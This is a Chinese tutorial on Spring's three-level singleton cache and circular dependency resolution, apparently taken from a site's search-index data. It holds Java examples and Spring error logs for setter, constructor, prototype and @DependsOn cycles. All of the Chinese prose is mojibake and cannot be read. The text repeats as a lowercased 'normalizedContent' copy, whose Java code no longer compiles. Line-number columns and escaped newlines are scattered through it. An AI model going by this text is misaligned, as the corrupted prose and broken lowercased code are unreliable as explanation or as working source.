æåå¯¹è±¡ãsingletonFactories åæåå¯¹è±¡ (æªå¡«åå±æ§å¼)ãearlySingletonObjects ä»£çå¯¹è±¡ï¼åé¶æ®µå­æ¾å¯¹è±¡åå®¹ï¼æ¥è§£å³å¾ªç¯ä¾èµé®é¢ã\n\né£ä¹ï¼è¿éæä»¬éè¦ç¥éä¸ä¸ªæ ¸å¿çåçï¼å°±æ¯ç¨äºè§£å³å¾ªç¯ä¾èµå°±å¿é¡»æ¯ä¸çº§ç¼å­å¢ï¼äºçº§è¡åï¼ä¸çº§å¯ä»¥ä¸ï¼å¶å®é½è½è§£å³ï¼åªä¸è¿ Spring æ¡æ¶çå®ç°è¦ä¿è¯å ä¸ªäºæï¼å¦åªæä¸çº§ç¼å­å¤çæµç¨æ²¡æ³æåï¼å¤æåº¦ä¹ä¼å¢å ï¼åæ¶åæåå¯¹è±¡å¯è½ä¼æç©ºæéå¼å¸¸ãèå°åæåä¸æåå¯¹è±¡åå¼ï¼å¤çèµ·æ¥ä¹æ´å ä¼éãç®åãææ©å±ãå¦å¤ Spring çä¸¤å¤§ç¹æ§ä¸­ä¸ä»æ IOC è¿æ AOPï¼ä¹å°±æ¯åºäºå­èç å¢å¼ºåçæ¹æ³ï¼è¯¥å­æ¾å°åªï¼èä¸çº§ç¼å­æä¸»è¦ï¼è¦è§£å³çå¾ªç¯ä¾èµå°±æ¯å¯¹ AOP çå¤çï¼ä½å¦ææ AOP ä»£çå¯¹è±¡çåå»ºæåï¼é£ä¹äºçº§ç¼å­ä¹ä¸æ ·å¯ä»¥è§£å³ãä½æ¯ï¼è¿å°±è¿èäº Spring åå»ºå¯¹è±¡çååï¼Spring æ´åæ¬¢æææçæ®é Bean é½åå§åå®æï¼å¨å¤çä»£çå¯¹è±¡çåå§åã\n\nä¸ä¸ªåä¸ªç¼å­è§£å³å¾ªç¯ä¾èµçä¾å­\n\npublic class ForRelyOn {\n\n    static Map<String,Object> singletonObjects = new HashMap<>();\n\n    public static void main(String[] args) throws Exception {\n        System.out.println(getBean(A.class).getB());\n        System.out.println(getBean(B.class).getA());\n    }\n\n    private static <T> T getBean(Class<T> beanClass) throws Exception {\n        String beanName = beanClass.getSimpleName().toLowerCase();\n        if (singletonObjects.containsKey(beanName)) {\n            return (T) singletonObjects.get(beanName);\n        }\n        // å®ä¾åå¯¹è±¡å¥ç¼å­0\n        Object obj = beanClass.newInstance();\n        singletonObjects.put(beanName, obj);\n        // å±æ§å¡«åè¡¥å¨å¯¹è±¡\n        Field[] fields = obj.getClass().getDeclaredFields();\n        for (Field field : fields) {\n            field.setAccessible(true);\n            Class<?> fieldClass = field.getType();\n            String fieldBeanName = fieldClass.getSimpleName().toLowerCase();\n            field.set(obj, singletonObjects.containsKey(fieldBeanName) ? singletonObjects.get(fieldBeanName) : getBean(fieldClass));\n            field.setAccessible(false);\n        }\n        return (T) obj;\n    }\n\n\n    static class A{\n        private B b;\n\n        public B getB() {\n            return b;\n        }\n\n        public void setB(B b) {\n            this.b = b;\n        }\n    }\n\n    static class B{\n        private A a;\n\n        public A getA() {\n            return a;\n        }\n\n        public void setA(A a) {\n            this.a = a;\n        }\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n\n\næç¤º\n\nä»¥ä¸é½æ¯æä»¬éè¿ åä¾ç set æ³¨å¥æ¹å¼æ¥è§£å³å¾ªç¯ä¾èµï¼å¨ spring ä¸­æå¤ç§å¤æ ·çæ³¨å¥æåµï¼é£ä¼å¸¦æ¥ä»ä¹æ ·çæåµå¢ï¼\n\n\n# ä¸åçå¾ªç¯ä¾èµé®é¢\n\n\n# set å¾ªç¯ä¾èµ\n\nå¨å¤ä¾ set çå¾ªç¯ä¾èµä¸­ï¼åªæå¤ä¾åå¤ä¾å¾ªç¯ä¾èµä¼åºç°æ¥éï¼æ¥éä¿¡æ¯å¦ä¸ï¼\n\nError creating bean with name 'b': Injection of resource dependencies failed; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'a': Injection of resource dependencies failed; nested exception is org.springframework.beans.factory.BeanCurrentlyInCreationException: Error creating bean with name 'b': Requested bean is currently in creation: Is there an unresolvable circular reference?\n\n\n1\n\n\nå¤ä¾ååä¾çå¾ªç¯ä¾èµä¸ä¼æé®é¢ï¼å¦ä¸æ¯ä¸ä¸ªåä¾åå¤ä¾çå¾ªç¯ä¾èµä»£ç ï¼\n\n@Component\npublic class A {\n    @Resource\n    private B b;\n    public void getb() {\n        System.out.println(b);\n    }\n}\n\n@Scope(ConfigurableBeanFactory.SCOPE_PROTOTYPE)\n@Component\npublic class B {\n    @Resource\n    private A a;\n    public void geta(){\n        System.out.println(a);\n    }\n}\n\npublic static void main(String[] args) {\n    ConfigurableApplicationContext run = SpringApplication.run(AdminApplication.class, args);\n    B b = run.getBean(B.class);\n    B b1 = run.getBean(B.class);\n    B b2 = run.getBean(B.class);\n    A a = run.getBean(A.class);\n    A a1 = run.getBean(A.class);\n    A a2 = run.getBean(A.class);\n    System.out.println(b);\n    System.out.println(b1);\n    System.out.println(b2);\n    a.getb();\n    a1.getb();\n    a2.getb();\n}\n\n// ç»æ\ncom.wt.admin.controller.B@1e5e2e06\ncom.wt.admin.controller.B@26c1f3eb\ncom.wt.admin.controller.B@79982bcc\ncom.wt.admin.controller.B@16b2d182\ncom.wt.admin.controller.B@16b2d182\ncom.wt.admin.controller.B@16b2d182\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\n\n# æé å¨ å¾ªç¯ä¾èµ\n\nä½å¨ æé å¨ å¾ªç¯ä¾èµçæ³¨å¥ä¸­ï¼å ä¸ºå¨æé å¨æ³¨å¥æ¹å¼ä¸ï¼éè¦ååå»ºä¸ä¸ª Bean å¯¹è±¡ï¼ç¶ååå°å¶ä» Bean æ³¨å¥è¯¥å¯¹è±¡ä¸­ãä½æ¯ï¼å¦æä¸¤ä¸ª Bean é½äºç¸ä¾èµï¼é£ä¹å°±ä¼åºç°æ æ³åå»ºä»»ä½ä¸ä¸ª Bean çæåµãå æ­¤ï¼Spring å¨è¿ç§æåµä¸ä¼æåºå¼å¸¸ä»¥é¿åç¨åºåºç°ä¸å¯é¢æµçéè¯¯ã\n\n@Configuration\npublic class Config {\n    @Bean\n    public A a(B b){\n        return new A(b);\n    }\n    @Bean\n    public B b(A a){\n        return new B(a);\n    }\n}\n// æ¥é\nThe dependencies of some of the beans in the application context form a cycle:\nâââââââ\n|  a defined in class path resource [com/wt/admin/controller/Config.class]\nâ     â\n|  b defined in class path resource [com/wt/admin/controller/Config.class]\nâââââââ\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nè§£å³è¿ç§é®é¢ï¼å¯ä»¥éè¿å¨æ¹æ³ä¸­æ·»å  @Lazy æ³¨è§£ï¼åªè½å å°æ¹æ³éï¼ä¸è½å å° @Bean çä¸ä¸ä½ç½®ï¼å¦åä¾ç¶ä¼æ¥å¾ªç¯ä¾èµï¼è¿ç§æ¹å¼å°½å¯è½çè¢«å®ä¹ä¸º @Lazy ç Bean å¨ç¬¬ä¸æ¬¡è¢«ä½¿ç¨çæ¶åå¨å»è¿è¡å®ä¾åã\n\næé å¨ä¹å­å¨å¤ä¾ååä¾çé®é¢ï¼å¦æä½ æ¯å¤ä¾ä¾èµå¾ªç¯ï¼ä¼æ¥éï¼å¦ä¸\n\n// å¤ä¾\n@Configuration\npublic class Config {\n    @Scope(ConfigurableBeanFactory.SCOPE_PROTOTYPE)\n    @Bean\n    public A a(B b){\n        return new A(b);\n    }\n    @Scope(ConfigurableBeanFactory.SCOPE_PROTOTYPE)\n    @Bean\n    public B b(A a){\n        return new B(a);\n    }\n}\n// æ¥éä¿¡æ¯\nError creating bean with name 'b' defined in class path resource [com/wt/admin/controller/Config.class]: Unsatisfied dependency expressed through method 'b' parameter 0; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'a' defined in class path resource [com/wt/admin/controller/Config.class]: Unsatisfied dependency expressed through method 'a' parameter 0; nested exception is org.springframework.beans.factory.BeanCurrentlyInCreationException: Error creating bean with name 'b': Requested bean is currently in creation: Is there an unresolvable circular reference?\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nå¦æä½ æ¯å¤ä¾ååä¾å¾ªç¯ä¾èµï¼ä¹ä¼æ¥éï¼ä½è¿éåæä»¬ä½¿ç¨æ³¨è§£è¿è¡å¤ä¾ååä¾çå¾ªç¯ä¾èµæµè¯ç»æå°±ææä¸åäº\n\n@Configuration\npublic class Config {\n    @Scope(ConfigurableBeanFactory.SCOPE_PROTOTYPE)\n    @Bean\n    public A a(B b){\n        return new A(b);\n    }\n    @Bean\n    public B b(A a){\n        return new B(a);\n    }\n}\n// æ¥éä¿¡æ¯\nThe dependencies of some of the beans in the application context form a cycle:\nâââââââ\n|  b defined in class path resource [com/wt/admin/controller/Config.class]\nâ     â\n|  a defined in class path resource [com/wt/admin/controller/Config.class]\nâââââââ\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\né£ä¹æé å¨å set æ³¨å¥çæ¹å¼å¨å¤ä¾ååä¾çç»è®ºå¦ä¸ï¼\n\n * åä¾å¾ªç¯ä¾èµï¼æé å¨çæ¹å¼ä¼æ¥éï¼å¯ä»¥ç¨ @Lazy è§£å³ï¼ï¼set æ³¨å¥çæ¹å¼ä¸ä¼æ¥é\n * å¤ä¾å¾ªç¯ä¾èµï¼æé å¨çæ¹å¼ä¼æ¥éï¼set æ³¨å¥çæ¹å¼ä¼æ¥éï¼ä¸¤èé½æ¯è°ç¨å¯¹è±¡æ¶ææ¥\n * åä¾åå¤ä¾å¾ªç¯ä¾èµï¼æé å¨çæ¹å¼ä¼æ¥éï¼å¯ä»¥ç¨ @Lazy è§£å³ï¼ï¼set æ³¨å¥çæ¹å¼ä¸ä¼æ¥é\n\n\n# @DependsOn\n\n@DependsOn æ³¨è§£å¯ä»¥å®ä¹å¨ç±»åâ½æ³ä¸ï¼æææ¯æè¿ä¸ªç»ä»¶è¦ä¾èµäºå¦â¼ä¸ªç»ä»¶ï¼ä¹å°±æ¯è¯´è¢«ä¾èµçç»ä»¶ä¼â½è¯¥ç»ä»¶åæ³¨åå° IOC å®¹å¨ä¸­ãå¦ä¸æ¡ä¾ï¼å ä¸ºä¸¤ä¸ªé½è¦åäºï¼æä»¥é æäºå¾ªç¯ä¾èµ\n\n@DependsOn(\"b\")\n@Component\npublic class A {\n    @Resource\n    private B b;\n    public void getb() {\n        System.out.println(b);\n    }\n}\n\n@DependsOn(\"a\")\n@Component\npublic class B {\n    @Resource\n    private A a;\n    public void geta(){\n        System.out.println(a);\n    }\n}\n// æ¥é\nError creating bean with name 'b' defined in file [D:\\workspace\\luckyDraw\\java\\target\\classes\\com\\wt\\admin\\controller\\B.class]: Circular depends-on relationship between 'b' and 'a'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n",normalizedContent:"spring ä¸çº§ç¼å­æ¯ spring æ¡æ¶ä¸­ç¨äºç®¡ç bean å¯¹è±¡çç¼å­æºå¶ãå®ç±ä¸ä¸ªä¸åçç¼å­åºåç»æï¼åå«æ¯ singletonobjectsãearlysingletonobjects å singletonfactoriesã\n\n * singletonobjectsï¼ä¸çº§ç¼å­ï¼æåå¯¹è±¡ï¼ï¼åä¾å¯¹è±¡ç¼å­åºåå­å¨å·²ç»å®å¨åå§ååçåä¾å¯¹è±¡ãå½ç¬¬ä¸æ¬¡ä½¿ç¨ getbean () æ¹æ³è·å bean æ¶ï¼spring ä¼å°è¯ä»è¿ä¸ªç¼å­åºè·åå¯¹è±¡ï¼å¦æè½å¤æ¾å°ï¼åç´æ¥è¿åè¯¥å¯¹è±¡å®ä¾ã\n * earlysingletonobjectsï¼äºçº§ç¼å­ï¼ä»£çå¯¹è±¡ï¼ç¹æ®çæåå¯¹è±¡ï¼ï¼å¦æä¸ä¸ªåä¾å¯¹è±¡éè¦å¼ç¨å¦ä¸ä¸ªåä¾å¯¹è±¡ï¼ä½åèå°æªè¢«å®å¨åå§åï¼é£ä¹å®¹å¨å°åå»ºä¸ä¸ªä»£çå¯¹è±¡ï¼proxy objectï¼ï¼å¹¶å°å¶æ¾å° earlysingletonobjects ä¸­ãè¿ä¸ªä»£çå¯¹è±¡ä¼æ´é²ä¸å®éå¯¹è±¡ç¸åçæ¥å£ï¼å¹¶ä¸è½å¤å¯¹å¶è¿è¡ä¸äºåºæ¬æä½ï¼ä½æ¯å®è¿æ²¡æè¢«å®å¨åå§åã\n * singletonfactoriesï¼ä¸çº§ç¼å­ï¼åæåå¯¹è±¡ä¹æ¯å·¥åå¯¹è±¡ï¼ï¼åä¾å·¥åç¼å­åºåå­å¨åå»º bean å®ä¾ç objectfactoryãå¨ bean ä¾èµå³ç³»çåå»ºè¿ç¨ä¸­ï¼å¦æ a ä¾èµ bï¼b åä¾èµ aï¼é£ä¹å¨åå»º a å b çè¿ç¨ä¸­å°±ä¼åºç°å¾ªç¯ä¾èµçé®é¢ãspring å°±æ¯éè¿æåæ´é²ä¸ä¸ªæªå®æåå§åç bean æ¥è§£å³è¿ä¸ªé®é¢çã\n\næç¤º\n\nå¯¹äº spring è®¾è®¡æ²¡æå®å¨çè§£çåå­¦å¯è½å¾é¾æç½ä»¥ä¸çè¯ï¼è¿æ¯éè¦ç¨ä»£ç å ä¸è¯´æï¼ä»¥ä¸æç« ä¼è®®ä»£ç çæ¹å¼å¨ç¨è®²æ¸æ¥\n\n\n# ä»£ç ä»ç»\n\né¦å spring å¨åå§åçæ¶åä¼åæææ bean å è½½å° beandefinition çç¼å­ä¸­ï¼åç»­ææå¯¹ bean çåå»ºé½æ¯ä» beandefinition ä¸­è·åè¯¦ç»å¯ä»¥ç spring æºç éè¯»ï¼ä¸ï¼ ï¼ç¶ååè¿è¡ bean çå½å¨æçè¿ç¨ï¼åå»ºå¥½ bean çå®ä¾æ¾å¥å° singletonobjects ç¼å­ä¸­ï¼ä½æ¯ä»£ç çç¬¬ä¸æ­¥é½æ¯ä»è·åå¼å§ï¼åªæè·åä¸å°ææåå»º\n\n    public object getbean(string name) throws beansexception {\n        return dogetbean(name, null);\n    }\n\n    public object getbean(string name, object... args) throws beansexception {\n        return dogetbean(name, args);\n    }\n\n    public <t> t getbean(string name, class<t> requiredtype) throws beansexception {\n        return (t) getbean(name);\n    }\n\n    protected <t> t dogetbean(final string name, final object[] args) {\n        // ä»ç¼å­ä¸­è·åå®ä¾\n        object sharedinstance = getsingleton(name);\n        if (sharedinstance != null) {\n            // å¦æå®ç°äº factorybeanï¼åéè¦è°ç¨ factorybean#getobject\n            return (t) getobjectforbeaninstance(sharedinstance, name);\n        }\n        // ä»beandefinitionåè¡¨ä¸­è·åå¯¹è±¡\n        beandefinition beandefinition = getbeandefinition(name);\n        // beanå®ä¾çåå»ºè¿ç¨\n        object bean = docreatebean(name, beandefinition, args);\n        // å¦æå®ç°äº factorybeanï¼åéè¦è°ç¨ factorybean#getobject\n        return (t) getobjectforbeaninstance(bean, name);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\nå¯ä»¥çå° getsingleton æ¹æ³å°±æ¯è·ååä¾ï¼ä¸æ¦æåç´æ¥è¿åï¼ä½ç¬¬ä¸æ¬¡è¯å®æ¯æ²¡æçï¼è¯¦ç»çä¸ä»çè·åæ¹å¼\n\n    public object getsingleton(string beanname) {\n        // ä»ä¸çº§ç¼å­ä¸­è·å\n        object singletonobject = singletonobjects.get(beanname);\n        if (null == singletonobject) {\n            singletonobject = earlysingletonobjects.get(beanname);\n            // å¤æ­äºçº§ç¼å­ä¸­æ¯å¦æå¯¹è±¡ï¼è¿ä¸ªå¯¹è±¡å°±æ¯ä»£çå¯¹è±¡ï¼å ä¸ºåªæä»£çå¯¹è±¡æä¼æ¾å°ä¸çº§ç¼å­ä¸­\n            if (null == singletonobject) {\n                objectfactory<?> singletonfactory = singletonfactories.get(beanname);\n                if (singletonfactory != null) {\n                    singletonobject = singletonfactory.getobject();\n                    // æä¸çº§ç¼å­ä¸­çä»£çå¯¹è±¡ä¸­ççå®å¯¹è±¡è·ååºæ¥ï¼æ¾å¥äºçº§ç¼å­ä¸­\n                    earlysingletonobjects.put(beanname, singletonobject);\n                    singletonfactories.remove(beanname);\n                }\n            }\n        }\n        return singletonobject;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\næ²¡æè·åå°å®ä¾åä» beandefinition ä¸­è·å bean çå®ä¹ä¿¡æ¯è°ç¨ docreatebean åå»º bean çå®ä¾\n\n    protected object docreatebean(string beanname, beandefinition beandefinition, object[] args) {\n        object bean = null;\n        try {\n            // å®ä¾å bean\n            bean = createbeaninstance(beandefinition, beanname, args);\n            // å¤çå¾ªç¯ä¾èµï¼å°å®ä¾ååçbeanå¯¹è±¡æåæ¾å¥ç¼å­ä¸­æ´é²åºæ¥\n            if (beandefinition.issingleton()) {\n                object finalbean = bean;\n                addsingletonfactory(beanname, () -> getearlybeanreference(beanname, beandefinition, finalbean));\n            }\n            // æ¯å¦éè¦ç»§ç»­è¿è¡åç»­çå±æ§å¡«å\n            boolean continuewithpropertypopulation = applybeanpostprocessorsafterinstantiation(beanname, bean);\n            if (!continuewithpropertypopulation) {\n                return bean;\n            }\n            // å¨è®¾ç½® bean å±æ§ä¹åï¼åè®¸ beanpostprocessor ä¿®æ¹å±æ§å¼ï¼æ³¨è§£å±æ§å¡«åï¼\n            applybeanpostprocessorsbeforeapplyingpropertyvalues(beanname, bean, beandefinition);\n            // ç» bean å¡«åå±æ§ï¼xmlå±æ§å¡«åï¼\n            applypropertyvalues(beanname, bean, beandefinition);\n            // æ§è¡ bean çåå§åæ¹æ³å beanpostprocessor çåç½®ååç½®å¤çæ¹æ³\n            bean = initializebean(beanname, bean, beandefinition);\n        } catch (exception e) {\n            throw new beansexception(\"instantiation of bean failed\", e);\n        }\n        // æ³¨åå®ç°äº disposablebean æ¥å£ç bean å¯¹è±¡\n        registerdisposablebeanifnecessary(beanname, bean, beandefinition);\n        // å¤æ­ scope_singletonãscope_prototype\n        object exposedobject = bean;\n        if (beandefinition.issingleton()) {\n            // è·åä»£çå¯¹è±¡\n            exposedobject = getsingleton(beanname);\n            registersingleton(beanname, exposedobject);\n        }\n        return exposedobject;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\nå¶ä¸­ applypropertyvalues è¿ä¸ªæ¹æ³ï¼å¯¹è¦åå»ºçå®ä¾è¿è¡å±æ§å¡«åçæ¶åä¼è¿å¥å¾ªç¯ä¾èµçé®é¢ï¼ä¸æ¦éå°æ¯ beanreference ç±»åçï¼åä¼è°ç¨ getbean æ¹æ³å»è·åå®ä¾ï¼è¯¥æ¹æ³åä¼åå°ä¸é¢çæ¹æ³ã\n\n    protected void applypropertyvalues(string beanname, object bean, beandefinition beandefinition) {\n        try {\n            // è¿éè·åå°  bean ä¿¡æ¯éçå±æ§æåªäºï¼ä¹å°±æ¯ä¸ä¸ªå¯¹è±¡æåªäºå±æ§ï¼å¹¶å¾ªç¯èµå¼å°æåå»ºå®ä¾çå±æ§ä¸­å»\n            propertyvalues propertyvalues = beandefinition.getpropertyvalues();\n            for (propertyvalue propertyvalue : propertyvalues.getpropertyvalues()) {\n                string name = propertyvalue.getname();\n                object value = propertyvalue.getvalue();\n                if (value instanceof beanreference) {\n                    // a ä¾èµ bï¼è·å b çå®ä¾å\n                    beanreference beanreference = (beanreference) value;\n                    value = getbean(beanreference.getbeanname());\n                }\n                // ç±»åè½¬æ¢ï¼ä¸æ¯ä¾§éç¹å¯ä»¥ä¸ç\n                else {\n                    class<?> sourcetype = value.getclass();\n                    class<?> targettype = (class<?>) typeutil.getfieldtype(bean.getclass(), name);\n                    conversionservice conversionservice = getconversionservice();\n                    if (conversionservice != null) {\n                        if (conversionservice.canconvert(sourcetype, targettype)) {\n                            value = conversionservice.convert(value, targettype);\n                        }\n                    }\n                }\n                // åå°è®¾ç½®å±æ§å¡«å\n                 beanutil.setfieldvalue(bean, name, value);\n            }\n        } catch (exception e) {\n            throw new beansexception(\"error setting property valuesï¼\" + beanname + \" messageï¼\" + e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\nå½ä¸ä¸ªå®ä¾çåå»ºåºæ¬å®æï¼ä»ä¼æèªå·±æ·»å å°ä¸çº§ç¼å­å¯¹è±¡ï¼åä¸ºä¸ä¸ªæåæä¾ç»å¶ä»æ¹æ³ä½¿ç¨ãå¦ä¸æ¹æ³å°±æ¯æ·»å å°ä¸çº§ç¼å­çè¿ç¨ï¼å¶ä¸­ getsingleton å¨è·åä¸çº§ç¼å­æ°æ®å°äºçº§ç¼å­çæ¶åä¼æ§è¡ singletonfactory.getobject (); è¿æ¯ä¸ä¸ªæ¹æ³ï¼ä¼å»æ§è¡ getearlybeanreference (beanname, beandefinition, finalbean) æ¹æ³ï¼è¯¥æ¹æ³ä¼å¾å°å·¥åæ¹æ³éé¢çä¸ä¸ªä»£çå¯¹è±¡ãç¶ååæä»£çå¯¹è±¡å­å°ä¸çº§ç¼å­ãè³æ­¤ bean çå®ä¾åå°ç¼å­çè¿ç¨å°±ç»æã\n\n// å¤æ­ scope_singletonãscope_prototype\nobject exposedobject = bean;\nif (beandefinition.issingleton()) {\n    // æä¸çº§ç¼å­å¯¹è±¡è½¬æ¢ä¸ºäºçº§ç¼å­å¯¹è±¡\n    exposedobject = getsingleton(beanname);\n    // æäºçº§ç¼å­å¯¹è±¡è½¬æ¢ä¸ºä¸çº§ç¼å­å¯¹è±¡\n    registersingleton(beanname, exposedobject);\n}\n\n// getsingleton çé¨åä»£ç å®ç°\nobjectfactory<?> singletonfactory = singletonfactories.get(beanname);\nif (singletonfactory != null) {\n    // è·åä»£çå¯¹è±¡\n    singletonobject = singletonfactory.getobject();\n    // æä¸çº§ç¼å­ä¸­çä»£çå¯¹è±¡ä¸­ççå®å¯¹è±¡è·ååºæ¥ï¼æ¾å¥äºçº§ç¼å­ä¸­\n    earlysingletonobjects.put(beanname, singletonobject);\n    singletonfactories.remove(beanname);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# æµç¨ä»ç»\n\næäºå®æ´çæ¦å¿µåï¼æä»¬å¯ä»¥èèå¾ªç¯ä¾èµçå­å¨ï¼å½ a ä¾èµ bï¼b åä¾èµ aï¼é£ä¹è§£å³ä¾èµçè¿ç¨åæ¯å¦ä½åçï¼å¯ä»¥çä¸å¾ï¼\n\n\n\n 1. ä¼åå¨ getbean æ¹æ³éé¢æ¾ aï¼éè¿ä¸äºä¸çº§ç¼å­ä¸­å¯»æ¾ï¼å¦ææ¾å°åç´æ¥è¿å\n 2. æ²¡æ¾å°å°±å»åå»º a å¹¶æ¾å¥ singletonfactories ä¸çº§ç¼å­ï¼ä¼å¯¹ a çå±æ§å¼è¿è¡å¡«åï¼æ­¤æ¶ a çå±æ§ä¾èµäº bï¼å°±è¦è°ç¨ getbean æ¾ b\n 3. éè¿å¨ getbean ç ä¸äºä¸çº§ç¼å­æ¥æ¾ï¼å¦ææ¾å°äºç´æ¥è¿å\n 4. æ²¡æ¾å°å°±å»åå»º b å¹¶æ¾å¥ singletonfactories ä¸çº§ç¼å­ï¼ä¼å¯¹ b çå±æ§å¼è¿è¡å¡«åï¼æ­¤æ¶ b çå±æ§ä¾èµäº aï¼å°±è¦è°ç¨ getbean æ¾ a\n 5. æ­¤æ¶ç a å·²ç»å¨ä¸çº§ç¼å­ï¼å¯ä»¥å¨ä¸çº§ç¼å­ä¸­æ¾å°ï¼æ¾å°åä¼çæ a ä»£çå¯¹è±¡ æ¾å¥ earlysingletonobjects äºçº§ç¼å­å¹¶è¿åè¿ä¸ªä»£çå¯¹è±¡\n 6. b æäºå±æ§ a çä»£çå¯¹è±¡ï¼æ­¤æ¶ b ææå±æ§å¡«åå®æ¯åï¼å°±è¦æ b æ·»å å°ä¸çº§ç¼å­ï¼ä½æ­¤æ¶ç b å¨ä¸çº§ç¼å­ï¼ä¼åæä¸çº§ç¼å­å¯¹è±¡çæä»£çåæ¾å¥å° earlysingletonobjects äºçº§ç¼å­ï¼åç±äºçº§ç¼å­æå¯¹è±¡æ¾å° singletonobjects ä¸çº§ç¼å­å¯¹è±¡\n 7. æ­¤æ¶ç b å·²ç»æ¾å°ä¸çº§ç¼å­å¯¹è±¡äºï¼å¹¶ç»æäº b çåå»ºæµç¨ï¼æä»¥ä¼è¿åå°ç¬¬ 2 æ­¥ï¼a å°±æäº b çå®ä¾ï¼a çå±æ§å¡«åå®æ¯åï¼å°±è¦æ a æ·»å å°ä¸çº§ç¼å­ï¼ä½æ­¤æ¶ç a å·²ç»å¨äºçº§ç¼å­ï¼æä»¥å°±å¯ä»¥ç´æ¥æ¾å¥å° singletonobjects ä¸çº§ç¼å­\n\nç°å¨æä»¬ç¥éï¼æç§ spring æ¡æ¶çè®¾è®¡ï¼ç¨äºè§£å³å¾ªç¯ä¾èµéè¦ç¨å°ä¸ä¸ªç¼å­ï¼è¿ä¸ä¸ªç¼å­åå«å­æ¾äº singletonobjects æåå¯¹è±¡ãsingletonfactories åæåå¯¹è±¡ (æªå¡«åå±æ§å¼)ãearlysingletonobjects ä»£çå¯¹è±¡ï¼åé¶æ®µå­æ¾å¯¹è±¡åå®¹ï¼æ¥è§£å³å¾ªç¯ä¾èµé®é¢ã\n\né£ä¹ï¼è¿éæä»¬éè¦ç¥éä¸ä¸ªæ ¸å¿çåçï¼å°±æ¯ç¨äºè§£å³å¾ªç¯ä¾èµå°±å¿é¡»æ¯ä¸çº§ç¼å­å¢ï¼äºçº§è¡åï¼ä¸çº§å¯ä»¥ä¸ï¼å¶å®é½è½è§£å³ï¼åªä¸è¿ spring æ¡æ¶çå®ç°è¦ä¿è¯å ä¸ªäºæï¼å¦åªæä¸çº§ç¼å­å¤çæµç¨æ²¡æ³æåï¼å¤æåº¦ä¹ä¼å¢å ï¼åæ¶åæåå¯¹è±¡å¯è½ä¼æç©ºæéå¼å¸¸ãèå°åæåä¸æåå¯¹è±¡åå¼ï¼å¤çèµ·æ¥ä¹æ´å ä¼éãç®åãææ©å±ãå¦å¤ spring çä¸¤å¤§ç¹æ§ä¸­ä¸ä»æ ioc è¿æ aopï¼ä¹å°±æ¯åºäºå­èç å¢å¼ºåçæ¹æ³ï¼è¯¥å­æ¾å°åªï¼èä¸çº§ç¼å­æä¸»è¦ï¼è¦è§£å³çå¾ªç¯ä¾èµå°±æ¯å¯¹ aop çå¤çï¼ä½å¦ææ aop ä»£çå¯¹è±¡çåå»ºæåï¼é£ä¹äºçº§ç¼å­ä¹ä¸æ ·å¯ä»¥è§£å³ãä½æ¯ï¼è¿å°±è¿èäº spring åå»ºå¯¹è±¡çååï¼spring æ´åæ¬¢æææçæ®é bean é½åå§åå®æï¼å¨å¤çä»£çå¯¹è±¡çåå§åã\n\nä¸ä¸ªåä¸ªç¼å­è§£å³å¾ªç¯ä¾èµçä¾å­\n\npublic class forrelyon {\n\n    static map<string,object> singletonobjects = new hashmap<>();\n\n    public static void main(string[] args) throws exception {\n        system.out.println(getbean(a.class).getb());\n        system.out.println(getbean(b.class).geta());\n    }\n\n    private static <t> t getbean(class<t> beanclass) throws exception {\n        string beanname = beanclass.getsimplename().tolowercase();\n        if (singletonobjects.containskey(beanname)) {\n            return (t) singletonobjects.get(beanname);\n        }\n        // å®ä¾åå¯¹è±¡å¥ç¼å­0\n        object obj = beanclass.newinstance();\n        singletonobjects.put(beanname, obj);\n        // å±æ§å¡«åè¡¥å¨å¯¹è±¡\n        field[] fields = obj.getclass().getdeclaredfields();\n        for (field field : fields) {\n            field.setaccessible(true);\n            class<?> fieldclass = field.gettype();\n            string fieldbeanname = fieldclass.getsimplename().tolowercase();\n            field.set(obj, singletonobjects.containskey(fieldbeanname) ? singletonobjects.get(fieldbeanname) : getbean(fieldclass));\n            field.setaccessible(false);\n        }\n        return (t) obj;\n    }\n\n\n    static class a{\n        private b b;\n\n        public b getb() {\n            return b;\n        }\n\n        public void setb(b b) {\n            this.b = b;\n        }\n    }\n\n    static class b{\n        private a a;\n\n        public a geta() {\n            return a;\n        }\n\n        public void seta(a a) {\n            this.a = a;\n        }\n    